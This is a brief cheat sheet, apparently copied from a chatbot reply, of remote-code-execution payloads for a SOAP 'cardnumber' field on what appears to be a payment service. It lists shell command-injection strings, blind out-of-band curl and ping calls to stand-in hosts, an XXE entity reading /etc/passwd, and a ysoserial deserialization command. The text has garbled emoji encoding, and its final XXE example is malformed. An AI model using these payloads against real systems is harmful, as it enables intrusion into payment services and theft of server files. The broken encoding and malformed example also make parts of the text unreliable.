ðŸ§ª Common RCE Test Strategies
âœ… 1. Command Injection (Linux / Windows)
Send payloads in the cardnumber field like:

xml
Copy
Edit
<cardnumber xsi:type="xsd:string">511031; whoami</cardnumber>
Or for Windows:

xml
Copy
Edit
<cardnumber xsi:type="xsd:string">511031 & whoami</cardnumber>
Test variations:

511031 | whoami

511031 && id

511031 || uname -a

511031$(whoami)

511031`id`

ðŸ“Œ Observe the response or use out-of-band interaction (like a DNS pingback or Burp Collaborator).

âœ… 2. Out-of-Band Exploitation (Blind RCE)
Use external interaction if the app returns no direct result:

xml
Copy
Edit
<cardnumber xsi:type="xsd:string">511031; curl http://yourdomain.com/</cardnumber>
Or ping an external server:

xml
Copy
Edit
<cardnumber xsi:type="xsd:string">511031; ping yourhost.dnslog.cn</cardnumber>
Tools:

Burp Collaborator

dnslog.cn / interact.sh

âœ… 3. Deserialization-Based RCE
If the server uses Java, .NET, or PHP and unserializes objects from XML payloads, try:

xml
Copy
Edit
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
Or use malicious serialized objects like Java serialized payloads:

bash
Copy
Edit
java -jar ysoserial.jar CommonsCollections1 'curl yourdomain.com' > payload.xml
Inject the output into the cardnumber or a hidden parameter.

âœ… 4. SOAPAction Manipulation + Header Fuzzing
Sometimes, the SOAPAction header or other headers are mishandled, and you can smuggle RCE payloads:


<cardnumber>511031</cardnumber>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

Alter SOAPAction to unexpected or unsafe function

Inject RCE payloads via custom headers (Burp Intruder)

